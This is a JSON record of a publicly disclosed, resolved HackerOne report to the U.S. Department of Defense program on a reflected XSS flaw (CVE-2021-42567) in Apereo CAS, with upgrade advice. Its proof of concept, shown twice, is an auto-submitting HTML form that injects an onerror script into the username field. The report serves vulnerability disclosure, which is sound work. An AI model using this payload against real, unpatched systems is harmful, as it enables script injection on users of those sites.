{
  "id": 1446236,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ2MjM2",
  "url": "https://hackerone.com/reports/1446236",
  "title": "CVE-2021-42567 - Apereo CAS Reflected XSS on https://█████████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-01-11T08:50:21.503Z",
  "submitted_at": "2022-01-11T08:50:21.523Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "3th1c_yuk1",
    "url": "/3th1c_yuk1",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/axxil2x3w0itqjnj8zt839eoi0gr/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2021-42567"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-03-18T18:58:38.943Z",
  "bug_reporter_agreed_on_going_public_at": "2022-02-25T13:56:09.259Z",
  "team_member_agreed_on_going_public_at": "2022-03-18T18:58:38.796Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Apereo CAS through 6.4.1 allows XSS via POST requests sent to the REST API endpoints. CAS is vulnerable to a Reflected Cross-Site Scripting attack, via POST requests sent to the REST API endpoints. The payload could be injected on URLs: /███████/. Malicious scripts can be submitted to CAS via parameters such as the ticket id or the username. That results in CAS rejecting the request and producing a response in which the value of the vulnerable parameter is echoed back, resulting in its execution.\n\nVULNERABLE SITE: https://██████████\n\nVULNERABLE ENDPOINT: https://███████/█████████/\n\nPROOF OF CONCEPT:\n-----------------------\n* It seems easy as you just need to drop the XSS payload inside the parameter \"username\" or at the end of the endpoint's path (in URL-encoded form, of course). Apereo CAS rejects the request and echoed back the ticket's ID or the username in the HTTP response without sanitizing.\n\n<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"https://█████████/████████/\" method=\"POST\">\n      <input type=\"hidden\" name=\"username\" value=\"<img/src/onerror=alert(document.domain)>\" />\n      <input type=\"hidden\" name=\"password\" value=\"Mellon\" />\n    </form>\n  </body>\n</html>\n\n* Save the above HTML code as xss.html\n* Open it on the browser \n* You can notice that the XSS is triggered via a POST request.\n\n## Impact\n\nApereo CAS through 6.4.1 allows XSS via POST requests sent to the REST API endpoints. \n\nREFERENCES :\n---------------\n    * https://apereo.github.io/2021/10/18/restvuln/\n    * https://www.sudokaikan.com/2021/12/exploit-cve-2021-42567-post-based-xss.html\n    * https://github.com/sudohyak/exploit/blob/dcf04f704895fe7e042a0cfe9c5ead07797333cc/CVE-2021-42567/README.md\n    * https://nvd.nist.gov/vuln/detail/CVE-2021-42567\n    * https://github.com/apereo/cas/releases\n\nBest Regards,\n3th1c_yuk1\n\n## System Host(s)\n█████████\n\n## Affected Product(s) and Version(s)\nApereo CAS\n\n## CVE Numbers\nCVE-2021-42567\n\n## Steps to Reproduce\n* It seems easy as you just need to drop the XSS payload inside the parameter \"username\" or at the end of the endpoint's path (in URL-encoded form, of course). Apereo CAS rejects the request and echoed back the ticket's ID or the username in the HTTP response without sanitizing.\n\n<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"https://██████/██████████/\" method=\"POST\">\n      <input type=\"hidden\" name=\"username\" value=\"<img/src/onerror=alert(document.domain)>\" />\n      <input type=\"hidden\" name=\"password\" value=\"Mellon\" />\n    </form>\n  </body>\n</html>\n\n* Save the above HTML code as xss.html\n* Open it on the browser \n* You can notice that the XSS is triggered via a POST request.\n\n## Suggested Mitigation/Remediation Actions\nYou should check the server's version and update to ... not the versions 6.3.7.1 and 6.4.2, but the versions 6.3.7.4 and 6.4.4.2 to mitigate this XSS.\n\n",
  "weakness": {
    "id": 61,
    "name": "Cross-site Scripting (XSS) - Reflected"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 2,
  "voters": [
    "3th1c_yuk1",
    "shivammusic"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
